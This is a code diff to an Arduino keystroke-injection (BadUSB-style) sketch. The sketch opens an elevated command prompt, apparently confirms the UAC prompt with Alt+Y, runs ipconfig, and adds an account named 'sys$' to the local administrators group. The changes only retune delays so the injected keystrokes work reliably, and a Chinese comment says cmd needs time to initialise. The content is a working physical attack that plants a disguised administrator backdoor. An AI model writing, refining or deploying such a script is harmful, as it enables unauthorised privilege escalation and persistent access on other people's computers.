@@ -19,13 +19,13 @@ void setup() {
   Keyboard.press(KEY_RETURN);
   delay(100);
   Keyboard.releaseAll();
-  delay(500);
+  delay(1000);
   Keyboard.press(KEY_LEFT_ALT);
-  delay(100);
+  delay(1000);
   Keyboard.press('y');
-  delay(500);
+  delay(1000);
   Keyboard.releaseAll();
-  delay(2000);//延迟不宜过短，cmd初始化需要时间
+  delay(7000);//延迟不宜过短，cmd初始化需要时间
   //------------------start
   Keyboard.println("ipconfig");
   delay(1000); 
@@ -46,12 +46,13 @@ void setup() {
   Keyboard.press(KEY_RETURN);
   delay(100);
   Keyboard.release(KEY_RETURN);
-  delay(3000);
+  delay(5000);
   Keyboard.println("net localgroup administrators sys$ /add");
   delay(1000); 
   Keyboard.press(KEY_RETURN);
-  delay(2000);
+  delay(100);
   Keyboard.release(KEY_RETURN);
+  delay(1500);
   //===========
   Keyboard.println("exit");
   delay(1000); 
